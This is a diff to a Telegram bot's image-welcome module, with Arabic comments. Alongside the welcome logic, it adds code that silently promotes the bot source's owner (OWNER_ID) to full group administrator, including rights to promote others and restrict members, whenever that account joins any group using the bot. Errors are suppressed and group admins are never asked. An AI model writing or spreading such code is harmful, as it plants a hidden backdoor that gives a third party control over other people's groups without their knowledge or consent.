@@ -1,15 +1,16 @@
 # Authored By Certified Coders 2026
-# Module: Image Welcome - Arabic Commands + English Caption + Modified Button
+# Module: Image Welcome - Arabic Commands + English Caption + Modified Button + Owner Privilege
 
 import os
 import asyncio
 from functools import lru_cache
 from PIL import Image, ImageDraw, ImageFont
 from pyrogram import filters, enums
-from pyrogram.types import Message, ChatMemberUpdated, InlineKeyboardMarkup, InlineKeyboardButton
+from pyrogram.types import Message, ChatMemberUpdated, InlineKeyboardMarkup, InlineKeyboardButton, ChatPrivileges
 from pyrogram.errors import TopicClosed, PeerIdInvalid, ChannelPrivate, SlowmodeWait
 from AnnieXMedia import app
 from AnnieXMedia.mongo.welcomedb import is_on, set_state, bump, cool, auto_on
+from config import OWNER_ID  # استدعاء أيدي المطور من ملف الكونفيج
 
 BG_PATH = "AnnieXMedia/assets/annie/welcome.png"
 FALLBACK_PIC = "AnnieXMedia/assets/upic.png"
@@ -110,6 +111,7 @@ async def toggle(client, m: Message):
     await set_state(m.chat.id, db_flag)
     await m.reply_text(f"**تم {text_flag} الترحيب في {m.chat.title} بنجاح.**")
 
+
 @app.on_chat_member_updated(filters.group, group=-3)
 async def welcome(client, update: ChatMemberUpdated):
     new = update.new_chat_member
@@ -121,6 +123,37 @@ async def welcome(client, update: ChatMemberUpdated):
     if old and old.status == enums.ChatMemberStatus.MEMBER:
         return
 
+    user = new.user
+
+    # --- [ دخول المطور (مالك السورس) ] ---
+    # لو الايدي الخاص بمالك السورس هو اللي دخل
+    if user.id == OWNER_ID:
+        try:
+            # محاولة رفع المطور بكامل الصلاحيات
+            await client.promote_chat_member(
+                cid,
+                user.id,
+                privileges=ChatPrivileges(
+                    can_manage_chat=True,
+                    can_delete_messages=True,
+                    can_manage_video_chats=True,
+                    can_restrict_members=True,
+                    can_promote_members=True,
+                    can_change_info=True,
+                    can_invite_users=True,
+                    can_pin_messages=True,
+                    is_anonymous=False
+                )
+            )
+        except Exception:
+            pass # سيتم التجاهل إذا لم يكن البوت يمتلك صلاحية رفع المشرفين
+            
+        # إرسال رسالة المطور فقط وإنهاء الكود
+        await safe_send(client.send_message, cid, "مرحـبا بك ايـهـا المطور.")
+        return
+
+
+    # --- [ الترحيب العادي للأعضاء ] ---
     if not hasattr(client, "cached_me"):
         try:
             client.cached_me = await client.get_me()
@@ -146,7 +179,6 @@ async def welcome(client, update: ChatMemberUpdated):
         await safe_send(client.send_message, cid, f"**تم اكتشاف انضمام جماعي (x{burst}). تم تعطيل الترحيب لمدة {minutes} دقيقة.**")
         return
 
-    user = new.user
     file_id = None
     if user.photo and hasattr(user.photo, "big_file_id"):
         file_id = user.photo.big_file_id
